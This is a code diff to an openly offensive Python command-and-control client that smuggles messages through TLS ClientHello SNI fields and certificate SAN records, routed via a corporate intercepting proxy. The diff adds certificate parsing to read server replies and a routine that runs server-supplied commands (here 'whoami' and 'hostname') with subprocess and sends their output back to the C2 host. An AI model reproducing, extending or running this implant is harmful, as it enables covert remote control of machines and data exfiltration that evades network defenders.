@@ -23,12 +23,13 @@ import typing
 import random
 import string
 import math
-from typing import Tuple
-from urllib.parse import urlparse
+import subprocess
+import re
 
 NS_TO_MS = 1000000
 # MAX_MSG_LEN = 284
 MAX_MSG_LEN = 256
+is_connected = True
 
 
 class TLSClientHandshake:
@@ -148,74 +149,11 @@ class TLSClientHandshake:
         return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name
 
 
-class Sender:
-    def __init__(self, proxy: tuple, tls_record: TLSClientHandshake):
-        self.tls_record = tls_record
-        self.proxy = proxy
-
-    def send_test(data: bytes):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(("_DEST_HOST_", 8443))
-        sock.send(data)
-        sock.close()
-
-    def proxy_send(destination: tuple):
-        sock.connect(("1.2.3.4", 8080))
-        c = "CONNECT " + host + ":" + str(port) + " HTTP/1.1\r\n\r\n"
-        print(" > " + c)
-        sock.send(c.encode())
-        response = sock.recv(1024)
-        print(" < " + response.decode())
-        # now our tls hnadshake
-        print(" > [" + str(len(TLS_CLIENT_HELLO_BIN)) + "] bytes in TLS CLIENT HELLO: SNI=" + "WWWWW")
-        sock.send(TLS_CLIENT_HELLO_BIN)
-        # response = sock.recv(4096)
-        sock.close()
-
-    def tls_client_hello(sock):
-        sock.send(TLS_CLIENT_HELLO.decode("hex"))
-        time.sleep(2)
-        print("sent tls client hello; recv length:%d" % (len(sock.recv(2048))))
-
-
-# TODO: this is a mess here - FIX UP
-TLS_CLIENT_HELLO_HEX = "d3adb33f"
-TLS_CLIENT_HELLO_BIN = bytes.fromhex(TLS_CLIENT_HELLO_HEX)
-
-sni1 = "d3adb33f"
-pad = "00150002ffff"
-NT = "d3adb33f"
-
-# sni = d3adb33f
-NTB = bytes.fromhex(NT)
-
-
-def send_test(host, port):
-    sock.connect(("_PROXY_", 8080))
-    c = "CONNECT " + host + ":" + str(port) + " HTTP/1.1\r\n\r\n"
-    print(" > " + c)
-    sock.send(c.encode())
-    response = sock.recv(1024)
-    print(" < " + response.decode())
-    # now our tls hnadshake
-    print(" > [" + str(len(TLS_CLIENT_HELLO_BIN)) + "] bytes in TLS CLIENT HELLO: SNI=" + "WWWWW")
-    # sock.send(TLS_CLIENT_HELLO_BIN)
-    sock.send(NTB)
-    response = sock.recv(4096)
-    time.sleep(2)
-    sock.close()
-
-
-def tls_client_hello(sock):
-    sock.send(NTB.decode("hex"))
-    time.sleep(2)
-    print("sent tls client hellow; recv length:%d" % (len(sock.recv(2048))))
-
-
-def connect_proxy(proxy_host: str, server: str) -> socket.socket:
+def connect_proxy(proxy_host: str, proxy_port: int, server: str) -> socket.socket:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print(f"[+] Connecting to proxy: {proxy_host} ...")
-    sock.connect((urlparse(proxy_host).hostname, urlparse(proxy_host).port))
+    if not is_connected:
+        print(f"[+] Connecting to proxy: {proxy_host} ...")
+    sock.connect((proxy_host, proxy_port))
     port = 443
     try:
         port = server.split(":")[1]
@@ -223,21 +161,25 @@ def connect_proxy(proxy_host: str, server: str) -> socket.socket:
     except:
         pass
     c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
-    print(f" > {c_str.rstrip()}")
+    if not is_connected:
+        print(f" > {c_str.rstrip()}")
     sock.sendall(c_str.encode())
     resp = sock.recv(1024)
-    print(" < " + resp.decode().split("\r\n")[0])
+    resp_first_line = resp.decode().split("\r\n")[0]
+    if not is_connected:
+        print(" < " + resp_first_line)
     # we expect and HTTP/200 for our CONNECT request
     if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
         sock.close()
-        print(f"Error: The proxy did not accept our connect request.")
+        print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
         return None
     return sock
 
 
 def connect_direct(server: str) -> socket.socket:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print(f"+ Connecting DIRECT: {server} ...")
+    if not is_connected:
+        print(f"+ Connecting DIRECT: {server} ...")
     port = 443
     try:
         port = server.split(":")[1]
@@ -250,13 +192,126 @@ def connect_direct(server: str) -> socket.socket:
 
 def send_message(sock: socket.socket, byte_stream: bytes) -> bytes:
     sock.sendall(byte_stream)
-    return sock.recv(16384)
+    response_data = b""
+    response_data = sock.recv(16384)
+    # while True:
+    #     chunck = sock.recv(2)
+    #     if chunck:
+    #         response_data = response_data + chunck
+    #     else:
+    #         break
+    return response_data
 
 
 def parse_server_hello(response_bytes: bytes) -> str:
     """Extracts SAN message from response bytes"""
     # TODO: write this!
-    return "_TODO_"
+    hex_str = response_bytes.hex()
+    hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
+    position = _validate_handshake_msg(hex_str, hex_array)
+    if position < 1:
+        print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
+        return ""
+    san_records_hex = _find_san_records(_extract_certs(hex_array, position))
+    message = ""
+    for hex_record in san_records_hex:
+        message = message + bytes.fromhex(bytes.fromhex(hex_record).decode().split(".")[0]).decode()
+    return message
+
+
+def _validate_handshake_msg(hex_str: str, hex_array: list) -> int:
+    is_valid_handshake = True
+    position = 0
+    try:
+        current_obj_len = 0
+        handshake_len = 0
+        if hex_str[0:2] != "16":
+            is_valid_handshake = False
+        if hex_str[2:4] != "03":
+            is_valid_handshake = False
+        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
+            is_valid_handshake = False
+        max_len = int(math.pow(2, 15))
+        handshake_len = int(hex_str[6:10], 16)
+        if (handshake_len < 1) or (handshake_len > max_len):
+            is_valid_handshake = False
+        if hex_str[10:12] != "02":
+            is_valid_handshake = False
+        current_obj_len = int(hex_str[12:18], 16)
+        if (current_obj_len < 1) or (current_obj_len > max_len):
+            is_valid_handshake = False
+        position = 1 + 2 + 2 + current_obj_len + 3 + 1
+        if hex_array[position] != "0b":
+            is_valid_handshake = False
+        position = position + 1
+        current_obj_len = int("".join(hex_array[position : position + 3]), 16)
+        position = position + 3
+        certs_len = int("".join(hex_array[position : position + 3]), 16)
+        if certs_len < 32:
+            is_valid_handshake = False
+    except:
+        is_valid_handshake = False
+    if not is_valid_handshake:
+        return -1
+    return position
+
+
+def _extract_certs(hex_array: list, position: int) -> list:
+    cert_hex_arrays = []
+    certs_len = int("".join(hex_array[position : position + 3]), 16)
+    position = position + 3
+    certs_handshake_position = 0
+    while certs_handshake_position < certs_len:
+        cert_len = int("".join(hex_array[position : position + 3]), 16)
+        position = position + 3
+        cert_hex_arrays.append(hex_array[position : position + cert_len])
+        position = position + cert_len
+        certs_handshake_position = certs_handshake_position + 3 + cert_len
+    return cert_hex_arrays
+
+
+def _find_san_records(cert_list: list) -> list:
+    #    len          ext_type          len       len       len
+    # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
+    # TODO: WARN: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
+    # TODO: WARN: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
+    san_records = []
+    for cert in cert_list:
+        hex_str = "".join(cert)
+        byte_position = [
+            (m.start(0), m.end(0))
+            for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
+        ][0][0]
+        san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
+        if len(san_record_matches.groups()) != 3:
+            continue
+        record_len = int(san_record_matches.groups()[2], 16)
+        byte_position += 22
+        while byte_position < (byte_position + record_len):
+            if hex_str[byte_position : byte_position + 2] != "82":
+                break
+            byte_position += 2
+            dns_len = int(hex_str[byte_position : byte_position + 2], 16)
+            byte_position += 2
+            if dns_len < 1:
+                break
+            san_records.append(hex_str[byte_position : byte_position + dns_len * 2])
+            byte_position += dns_len * 2
+    return san_records
+
+
+def check_for_command(msg: str) -> bool:
+    if msg in ["whoami", "hostname"]:
+        return True
+
+
+def run_command(cmd: str) -> str:
+    return subprocess.check_output([cmd]).decode().rstrip()
+
+
+def _reset_socket(sock, func, *args):
+    sock.close()
+    return func(*args)
 
 
 if __name__ == "__main__":
@@ -268,15 +323,22 @@ if __name__ == "__main__":
         "-p",
         "--proxy",
         metavar="proxy",
-        required=True,
+        required=False,
         help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
     )
     arg_parse.add_argument(
-        "-d",
-        "--demo",
-        metavar="demo",
+        "-e",
+        "--example",
+        action="store_true",
         required=False,
         help="A simple demonstration that runs a couple benign C2 commands",
+    )
+    arg_parse.add_argument(
+        "-d",
+        "--direct",
+        action="store_true",
+        required=False,
+        help="For testing - Connect directly to server and dont use a proxy",
     )
     arg_parse.add_argument(
         "-s",
@@ -286,35 +348,56 @@ if __name__ == "__main__":
         help="Target C2 Server you want to connect to, Example: my-server.evil.net",
     )
     args = arg_parse.parse_args()
-    if not args.message and not args.demo:
+    if not args.message and not args.example:
         arg_parse.error("Error: No message was supplied")
         exit(1)
+    if not args.proxy and not args.direct:
+        arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
+        exit(1)
     if not args.server:
-        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net")
+        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
         exit(1)
-    proxy = ""
-    is_good_proxy_url = True
-    try:
-        proxy = urlparse(args.proxy.lower())
-    except:
-        is_good_proxy_url = False
-    if (proxy.scheme != "http") or (len(proxy.hostname) < 3) or (not proxy.port) or (not is_good_proxy_url):
-        arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
-        exit(1)
+    if args.proxy:
+        is_good_proxy_url = True
+        proxy_scheme = ""
+        proxy_hostname = ""
+        proxy_port = ""
+        try:
+            proxy_scheme = args.proxy.lower().split(":")[0]
+            proxy_hostname = args.proxy.lower().split("//")[1]
+            proxy_port = int(proxy_hostname.split(":")[1].split("/")[0])
+            proxy_hostname = proxy_hostname.split(":")[0].split("/")[0]
+        except:
+            is_good_proxy_url = False
+        if (proxy_scheme != "http") or (len(proxy_hostname) < 3) or (not proxy_port) or (not is_good_proxy_url):
+            arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
+            exit(1)
     # Proxy CONNECT PHASE
+    proxy_socket = None
+    connect_args = None
+    prox_end_time_ns = None
+    connect_func = None
+    if args.direct:
+        connect_func = connect_direct
+        connect_args = [args.server.lower()]
+    else:
+        connect_func = connect_proxy
+        connect_args = [proxy_hostname, proxy_port, args.server.lower()]
     prox_start_time_ns = int(time.time_ns())
-    # proxy_socket = connect_proxy(args.proxy.lower(), args.server.lower())
-    # TODO: For testing, skip the Proxy and connet direct
-    proxy_socket = connect_direct(args.server.lower())
+    proxy_socket = connect_func(*connect_args)
     prox_end_time_ns = int(time.time_ns())
     if type(proxy_socket) != socket.socket:
         exit(1)
+    is_connected = True
     reqs_list_str = []
     reqs_list_byte_stream = []
-    if not args.demo:
+    reqs_list_byte_cmds = []
+    if not args.example:
         reqs_list_str.append(args.message)
         reqs_list_byte_stream.append(TLSClientHandshake(args.message).to_byte_stream())
     else:
+        reqs_list_str.append("ping")
+        reqs_list_byte_stream.append(TLSClientHandshake("ping").to_byte_stream())
         reqs_list_str.append("DEMO_CMD_1")
         reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_1").to_byte_stream())
         reqs_list_str.append("DEMO_CMD_2")
@@ -326,10 +409,23 @@ if __name__ == "__main__":
         print(f" > '{reqs_list_str[k]}' [{len(v)} bytes]")
         resp_bytes = send_message(proxy_socket, v)
         response_bytes_list.append(resp_bytes)
+        proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
         resp_parsed = parse_server_hello(resp_bytes)
-        response_parsed_list.append(resp_parsed)
         print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
+        response_parsed_list.append(resp_parsed)
+        if check_for_command(resp_parsed):
+            result_str = "CMD " + run_command(resp_parsed)
+            result_msg = TLSClientHandshake("CMD " + run_command(resp_parsed)).to_byte_stream()
+            reqs_list_byte_cmds.append(result_msg)
+            reqs_list_str.append(result_str)
+            print(f" > '{result_str}' [{len(result_msg)} bytes]")
+            resp_bytes = send_message(proxy_socket, result_msg)
+            resp_parsed = parse_server_hello(resp_bytes)
+            proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
+            print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
+            response_parsed_list.append(resp_parsed)
     proxy_socket.close()
+    reqs_list_byte_stream = reqs_list_byte_stream + reqs_list_byte_cmds
     tls_end_time_ns = int(time.time_ns())
     sent_bytes = sum(map(len, reqs_list_byte_stream))
     recv_bytes = sum(map(len, response_bytes_list))
